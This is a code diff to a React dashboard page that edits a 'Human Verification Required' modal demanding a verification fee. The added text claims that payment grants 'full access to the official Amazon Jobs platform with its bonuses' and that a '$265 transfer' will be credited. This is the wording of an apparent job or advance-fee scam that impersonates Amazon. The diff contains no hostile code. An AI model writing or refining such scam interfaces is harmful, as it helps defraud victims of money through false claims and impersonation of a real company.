@@ -826,7 +826,7 @@ export default function DashboardPage() {
             <h2 className="text-2xl font-bold text-gray-900 text-center mb-4">Human Verification Required</h2>
 
             {/* Description */}
-            <p className="text-gray-600 text-center mb-6">
+            <p className="text-sm text-gray-600 text-center mb-6">
               Due to the high rate of system abuse, a verification fee is required to confirm you are human.
             </p>
 
@@ -840,7 +840,8 @@ export default function DashboardPage() {
 
             {/* Additional Info */}
             <p className="text-gray-600 text-center mb-6">
-              After payment, you will receive immediate access to the panel.
+              It will give you full access to the official Amazon Jobs platform with its bonuses. After payment, your
+              $265 transfer is validated and credited to your registered account.
             </p>
 
             {/* Buttons */}
